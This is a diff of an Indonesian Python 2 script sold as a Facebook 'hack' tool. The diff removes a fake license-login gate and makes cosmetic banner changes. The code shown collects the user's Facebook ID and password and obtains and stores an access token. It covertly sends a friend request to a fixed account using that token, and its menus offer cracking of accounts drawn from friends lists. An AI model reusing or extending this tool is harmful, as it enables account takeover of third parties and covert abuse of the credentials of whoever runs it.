@@ -54,11 +54,11 @@ logo = """
 \033[32m…//___//
 \033[32m../`—-’ / …
 \033[32m./____ / … 
-\033[32m╔═════════════════════════
-\033[33m{*}\033[0;1mAuthor \033[0;1m: \033[0;1mG U N A W A N
-\033[33m{*}\033[0;1mRecode \033[0;1m: \033[0;1mbye nawan
+\033[32m╔═══════════════════════════
+\033[33m{✓}\033[0;1mAuthor \033[0;1m: \033[0;1mG U N A W A N
+\033[33m{✓}\033[0;1mRecode \033[0;1m: \033[0;1mbye nawan
 \033[33m{✓}\033[0;1mYoutube \033[0;1m: \033[0;1mnawan barus
-\033[32m╚═════════════════════════"""""
+\033[32m╚═══════════════════════════"""""
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -73,32 +73,6 @@ cekpoint = []
 oks = []
 id = []
 
-def loginSC():
-	os.system('clear')
-        print 42*"\033[0;1m="
-	print"\033[1;97mSilahkan login Lisensi Scriptnya dulu bosku ✓"
-        print"\033[1;97mKalau gak tau Lisensinya,silahkan download ✓"
-        print"\033[1;97mDi website yang barusan di Alihkan Otomatis ✓"
-        print 42*"\033[0;1m="
-        print"\033[1;97mPASSWORD LISENSINYA INI DI UPDATE 3HARI SEKALI ✓"
-        print 42*"\033[0;1m="
-        print"\033[1;97mJanggan lupa Subscribe YouTube ADMIN ✓"
-        print"\033[1;97mYang barusan di Alikan Otomatis ✓"
-        print 42*"\033[0;1m="
-	os.system('xdg-open https://tatawirdat.blogspot.com')
-        username = raw_input("\033[1;96m[*] \033[1;97mUsername \033[1;91m: \033[1;92m")
-	password = raw_input("\033[1;96m[*] \033[1;97mPassword \033[1;91m: \033[1;92m")
-	if username =="sayang" and password =="kamu":
-		print"\033[1;96m[✓] \033[1;92mLogin success"
-                os.system('xdg-open https://www.youtube.com/channel/UCwdOY4YQZW5ejDEpo1SolHQ')
-		time.sleep(1)
-		login()
-	else:
-		print"\033[1;96m[!] \033[1;91mSalah!!"
-		os.system('xdg-open https://tatawirdat.blogspot.com')
-                time.sleep(1)
-                LoginSC()
-
 def login():
 	os.system('clear')
 	try:
@@ -107,10 +81,10 @@ def login():
 	except (KeyError,IOError):
 		os.system('clear')
 		print logo
-		print 42*"\033[0;1m="
+		print 42*"\033[0;1m-"
 		print('\033[34;1mSilahkan Daftar fb baru dari google chrome' )
 		print('\033[34;1mAgar tidak terkena chekpoint saat login' )
-		print 42*"\033[0;1m="
+		print 42*"\033[0;1m-"
 		print('\033[1;96m[✓] \x1b[33;1mLOGIN AKUN FACEBOOK KAMU \x1b[1;96m[ ! ]' )
 		id = raw_input('\033[32m[+] \x1b[33;1mID/Email \x1b[33;1m: \x1b[0;1m')
 		pwd = raw_input('\033[32m[+] \x1b[33;1mPassword \x1b[33;1m: \x1b[0;1m')
@@ -138,7 +112,7 @@ def login():
 				r=requests.get(url,params=data)
 				z=json.loads(r.text)
 				unikers = open("login.txt", 'w')
-                                unikers.write(z['access_token'])
+				unikers.write(z['access_token'])
 				unikers.close()
 				print '\n\033[1;96m[✓] \x1b[1;92mLogin Berhasil'
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
@@ -186,13 +160,11 @@ def menu():
 		keluar()
 	os.system("clear")
 	print logo
-        print 42*"\033[1;96m="
-        print('\033[34;1mSilahkan pilih nomor 1 agar masuk ke tahap selanjutnya' )
 	print 42*"\033[1;96m="
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[33;1m Nama Anda \033[1;91m: \033[0;1m"+nama+"\033[0;1m                  "
 	print "\033[1;96m[\033[1;97m✓\033[1;96m]\033[33;1m ID Anda   \033[1;91m: \033[0;1m"+id+"\x1b[0;1m              "
 	print 42*"\033[1;96m="
-	print "\x1b[32m1.\x1b[0;1m Hack facebook sekarang"
+	print "\x1b[32m1.\x1b[0;1m Hack facebook sekarang \033[32m(✓)"
 	print "\n\x1b[32m0.\x1b[34;1m Keluar            "
 	pilih()
 
@@ -226,8 +198,6 @@ def super():
 		keluar()
 	os.system('clear')
 	print logo
-        print 42*"\033[1;96m="
-        print('\033[34;1mSilahkan pilih nomor 2 agar masuk ke tahap selanjutnya' )
 	print 42*"\033[1;96m="
 	print "\x1b[32m1.\x1b[0;1m Hack dari daftar teman"
 	print "\x1b[32m2.\x1b[0;1m Hack dari daftar teman dari teman \033[32m(✓)"
@@ -251,10 +221,6 @@ def pilih_super():
 	elif peak =="2":
 		os.system('clear')
 		print logo
-                print 42*"\033[1;96m="
-                print('\033[34;1mCara pertama untuk mengambil ID teman' )
-                print('\033[34;1mMasuk ke FB yang mau di target' )
-                print('\033[34;1mSalin postingan pertama untuk mendapat kan ID teman' )
 		print 42*"\033[32m="
 		idt = raw_input("\033[1;96m[+] \033[1;93mMasukan ID teman \033[1;91m: \033[0;1m")
 		try:
@@ -391,4 +357,4 @@ def pilih_super():
        
 		
 if __name__ == '__main__':
-	loginSC()
+	login()
